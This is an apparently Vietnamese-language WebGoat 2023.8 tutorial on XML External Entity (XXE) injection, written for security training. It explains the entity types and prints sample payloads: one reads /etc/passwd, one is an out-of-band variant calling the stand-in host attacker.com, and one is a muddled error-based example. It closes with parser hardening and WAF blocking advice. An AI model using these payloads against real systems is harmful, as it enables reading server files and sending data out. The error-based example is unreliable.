# 1.02 | XXE

> Nguồn: https://tiennhm.io.vn/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-02
> Bài viết này sẽ hướng dẫn cách tấn công XXE trên WebGoat 2023.8

> 🔍 **XML Entities & XXE Injection**

## 📌 **1. XML Entity là gì?**
Trong XML, **Entity** là các thành phần có thể thay thế bằng nội dung cụ thể khi XML được parse. Có 3 loại chính:
1️⃣ **Internal Entity** – Được định nghĩa trong DTD, chỉ sử dụng trong tài liệu XML.
2️⃣ **External Entity** – Tham chiếu đến dữ liệu bên ngoài như file hệ thống hoặc URL.
3️⃣ **Parameter Entity** – Được sử dụng trong nội bộ DTD để tái sử dụng nội dung.

Ví dụ về **Internal Entity**:
```xml
<?xml version="1.0"?>
<!DOCTYPE users [
    <!ENTITY js "Jo Smith">
]>
<user>
    <name>&js;</name>
</user>
```
Khi XML parser xử lý, `&js;` sẽ được thay thế bằng `"Jo Smith"`.

## 🔥 **2. XML Parser và cách thức hoạt động**
Hệ thống sử dụng **XML parsers** để xử lý XML và có thể tự động ánh xạ dữ liệu vào các đối tượng trong ứng dụng.

Ví dụ trong Java:
```java
@XmlRootElement
class User {
    public String name;
}
```
Ứng dụng có thể nhận XML từ client và chuyển thành đối tượng `User`.

## 🚨 **3. XXE Injection là gì?**
**XXE (XML External Entity Injection)** là kỹ thuật tấn công khi ứng dụng xử lý XML đầu vào mà không vô hiệu hóa External Entity. Điều này có thể dẫn đến:
✔ **Đọc file nhạy cảm** (`/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`)
✔ **Tấn công DoS** (bằng "Billion Laughs Attack")
✔ **SSRF** (yêu cầu đến API nội bộ, dịch vụ cloud)
✔ **Quét cổng và pivoting** (sử dụng ứng dụng làm cầu nối đến hệ thống khác)
✔ **Thực thi mã độc** (nếu XML parser có lỗi bộ nhớ)

## 💣 **4. Các dạng XXE tấn công phổ biến**
### 🔹 **1. Classic XXE (Tiết lộ file hệ thống)**
Payload đọc `/etc/passwd`:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
⏩ Nếu server không chặn External Entity, nó sẽ trả về nội dung file `/etc/passwd`.

### 🔹 **2. Blind XXE (Không có phản hồi trực tiếp)**
Nếu ứng dụng không hiển thị lỗi hoặc nội dung file, hacker có thể dùng **out-of-band (OOB) attack**:
```xml
<!DOCTYPE data [
    <!ENTITY xxe SYSTEM "http://attacker.com/log?data=/etc/passwd">
]>
<data>&xxe;</data>
```
⏩ Nếu server gửi request đến `attacker.com`, hacker biết hệ thống bị dính XXE.

### 🔹 **3. Error-based XXE**
Lợi dụng lỗi xử lý XML để rò rỉ dữ liệu qua thông báo lỗi:
```xml
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
    <!ENTITY file "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
]>
<user>&file;</user>
```
⏩ Nếu parser phản hồi lỗi chứa nội dung file, hacker có thể khai thác.

## 🛡 **5. Cách phòng chống XXE**
✅ **Vô hiệu hóa DTD & External Entity trong XML Parser**
Trong Java:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```
Trong .NET:
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
```

✅ **Dùng JSON thay vì XML**
JSON không hỗ trợ entity → an toàn hơn.

✅ **Hạn chế quyền truy cập file trên server**
Dùng **chroot, SELinux** để giới hạn truy cập file hệ thống.

✅ **Sử dụng WAF (Web Application Firewall)**
Chặn payload chứa `<!ENTITY` hoặc `SYSTEM`.
